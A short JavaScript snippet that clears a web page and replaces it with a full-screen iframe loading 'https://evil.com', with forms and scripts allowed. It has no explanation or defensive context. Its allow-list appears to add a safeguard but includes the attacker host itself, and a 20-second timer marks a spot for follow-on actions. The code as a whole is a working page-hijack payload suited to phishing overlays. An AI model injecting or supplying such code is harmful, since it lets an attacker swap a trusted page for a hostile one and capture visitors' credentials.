(function replacePageWithIframe(targetUrl='https://evil.com'){
  const allowed=['https://evil.com','https://your-own-domain.example'];
  const urlOrigin=(()=>{try{return new URL(targetUrl).origin}catch{return null}})();
  if(!urlOrigin||!allowed.includes(urlOrigin)){console.error('Target URL not allowed');return;}

  // Clear the page
  document.head&&(document.head.innerHTML='');
  document.body&&(document.body.innerHTML='');

  // Create and append iframe immediately
  const iframe=document.createElement('iframe');
  iframe.src=targetUrl;
  iframe.style='position:fixed;top:0;left:0;width:100vw;height:100vh;border:0;z-index:2147483647';
  iframe.setAttribute('sandbox','allow-forms allow-scripts');
  iframe.setAttribute('referrerpolicy','no-referrer');
  document.body.appendChild(iframe);
  document.documentElement.style.overflow='hidden';
  document.body.style.overflow='hidden';

  // Start 20-second “delay” AFTER showing the iframe
  setTimeout(()=>{
    console.log('20 seconds passed after showing the iframe');
    // Put whatever you want to happen after 20 seconds here
  },20000);

})('https://evil.com');
